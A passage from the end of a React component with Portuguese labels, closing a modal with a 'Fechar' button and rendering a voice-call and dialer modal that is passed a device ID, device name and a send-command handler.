                  className="px-4 py-2 bg-[#081326] hover:bg-[#0e2142] text-slate-300 border border-[#142647] rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer"
                >
                  Fechar
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ðŸ“ž MODAL DE CHAMADA DE VOZ & DISCADOR (FALAR COM O APARELHO) */}
      <VoiceCallModal
        isOpen={showVoiceCallModal}
        onClose={() => setShowVoiceCallModal(false)}
        deviceId={deviceId || ''}
        deviceName={deviceName}
        onSendCommand={sendCommand}
      />
    </div>
  );
}




